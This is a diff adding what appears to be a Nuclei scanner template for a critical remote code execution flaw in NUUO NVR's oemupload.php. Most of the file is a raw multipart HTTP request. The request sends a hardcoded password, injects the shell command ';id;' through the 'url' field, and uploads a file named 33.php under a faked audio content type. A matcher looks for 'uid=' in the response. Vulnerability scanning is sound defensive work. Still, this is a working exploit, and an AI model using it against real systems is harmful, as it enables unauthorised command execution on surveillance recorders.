@@ -1,0 +1,38 @@
+id: nuuo-nvr-oemupload-rce
+
+info:
+  name: nuuo-nvr-oemupload-rce
+  author: HuanXiong
+  severity: critical
+
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /oemupload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Length: 375
+
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Disposition: form-data; name="pwd"
+
+        nvrmini2260
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Disposition: form-data; name="url"
+
+        ;id;
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
+        Content-Disposition: form-data; name="file"; filename="33.php"
+        Content-Type: audio/mp3
+
+        1
+        ------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
+
+    matchers:
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code == 200 && contains(body,'uid=')"
